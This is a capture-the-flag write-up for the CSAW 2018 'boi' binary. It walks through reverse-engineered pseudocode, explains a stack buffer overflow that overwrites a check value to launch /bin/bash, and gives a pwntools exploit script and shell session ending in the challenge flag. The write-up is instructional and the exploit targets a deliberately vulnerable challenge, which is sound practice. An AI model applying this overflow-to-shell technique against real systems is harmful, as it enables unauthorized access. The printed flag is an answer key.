# Csaw 2018 boi pwn 50

Let's take a look at what we have:

```
$	file boi 
boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
$	./boi 
Are you a big boiiiii??
000000000000000000000000000000000000000000000000000000000000
Fri Sep 21 02:06:59 EDT 2018
```

So we have a 64 bit elf, that scans in input, then prints the date. When we take a look at the C psuedocode generated by IDA, we see this:

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@4
  __int64 v4; // rcx@4
  __int64 buf; // [sp+10h] [bp-30h]@1
  __int64 v6; // [sp+18h] [bp-28h]@1
  __int64 target; // [sp+20h] [bp-20h]@1
  int v8; // [sp+28h] [bp-18h]@1
  __int64 stackCanary; // [sp+38h] [bp-8h]@1

  stackCanary = *MK_FP(__FS__, 40LL);
  buf = 0LL;
  v6 = 0LL;
  target = 0LL;
  v8 = 0;
  HIDWORD(target) = 0xDEADBEEF;
  puts("Are you a big boiiiii??");
  read(0, &buf, 0x18uLL);
  if ( HIDWORD(target) == 0xCAF3BAEE )
    run_cmd("/bin/bash", &buf);
  else
    run_cmd("/bin/date", &buf);
  result = 0;
  v4 = *MK_FP(__FS__, 40LL) ^ stackCanary;
  return result;
}
```

So we can see a couple of things. The first is that there is a buffer overflow bug with the `read` call into `buf`, it is allowing us to scan `0x18` (`24`) bytes of data into a `0x8` byte space (we can tell it is `8` bytes, since the variable below it (`v6`) is at `bp-0x28` and `0x30 - 0x28 = 0x8`).

Furthermore we can see that if `target` is set eqaul to `0xcaf3baee`, it will call `/bin/bash` for us. We can definetly overwrite the value in `target`, since it is only `0x10` (`16`) bytes away from the start of the input. The only thing is since `target` is a `HIDWORD`, we will need to add an additional `4` bytes to our input, before we start overwriting the value we need to. We can see that here in gdb (our input was `15935728` which translates to `0x3832373533393531`):

```
gdb-peda$ x/10g 0x7fffffffdda0
0x7fffffffdda0:	0x3832373533393531	0x000000000000000a
0x7fffffffddb0:	0xdeadbeef00000000	0x0000000000000000
0x7fffffffddc0:	0x00007fffffffdeb0	0xf0577e6ba81af300
0x7fffffffddd0:	0x00000000004006e0	0x00007ffff7a05b97
0x7fffffffdde0:	0x0000000000000000	0x00007fffffffdeb8
```

With that, we have the following exploit:

```
# Import pwntools
from pwn import *

# Establish the target
target = remote('pwn.chal.csaw.io', 9000)
#target = process('./boi')

# Form and send the payload
payload = "0"*0x14 + p64(0xcaf3baee)
target.sendline(payload)

# Drop to an interactive shell
target.interactive()
``` 

And when we run the exploit:

```
$	python exploit.py 
[+] Opening connection to pwn.chal.csaw.io on port 9000: Done
[*] Switching to interactive mode
 _    ___        ____   ___  _ _ _ _ 
| |__|_ _|__ _  | __ ) / _ \(_|_|_|_)
| '_ \| |/ _` | |  _ \| | | | | | | |
| |_) | | (_| | | |_) | |_| | | | | |
|_.__/___\__, | |____/ \___/|_|_|_|_|
         |___/                       
***************************************
Are you a big boiiiii??
00000000000000000000����^@^@^@^@
$ ls
ls
art.txt  boi  flag.txt    run.sh
$ w
w
 06:03:15 up 9 days,  9:26,  0 users,  load average: 638.29, 638.38, 638.39
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
$ cat flag.txt
cat flag.txt
flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}
```

Just like that, we got the flag!